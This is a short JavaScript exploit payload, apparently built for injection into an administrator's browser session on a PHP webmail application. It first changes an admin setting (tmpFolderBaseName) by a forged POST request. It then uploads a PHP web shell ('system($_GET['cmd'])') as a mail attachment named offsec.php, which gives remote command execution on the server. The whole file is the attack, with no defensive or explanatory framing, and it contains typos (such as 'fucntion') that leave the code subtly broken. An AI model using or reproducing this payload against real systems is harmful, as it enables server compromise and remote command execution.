var target = document.location.host;

fucntion pwnSettingtmpFolderBaseName(){

	var xhttp = new XMLHttpRequest();
	xhttp.open("POST", "http://"+ target + "/index.php/admin/settings/globalsave", true);
	xhttp.setRequestHeader("Content-type", "application/x-www-from-urlencoded");
	xhttp.send("save=1&fields[sql_user]=root&fields[tmpFolderBaseName]=");
}

function uploadAllTheThings(){

	var phpKode = "<?php system($_GET['cmd']); ?>";
	var fileSize = phpKode.length;
	var boundary = "-------------------270883142628617";
	var uri = "http://" + target + "/index.php/mail/composemessage/addattachment/composeID";
	xhr = new XMLHttpRequest();
	xhr.open("POST", uri, true);
	xhr.setRequestHeader("Content-Type", "multipart/form-data; boundary="+boundary);
	xhr.withCredentials = "true";
	var body = "";
	body += "--" + boundary + "\r\n";
	body += 'Content-Disposition: form-data; name="newAttachment"; filename="offsec.php"\r\n';
	body += "Content-Type: \r\n\r\n";
	body += phpKode + "\r\n";
	body += "--" + boundary + "--";
	xhr.send(body);
	return true;
}

pwnSettingtmpFolderBaseName();
setTimeout(uploadAllTheThings,1000);
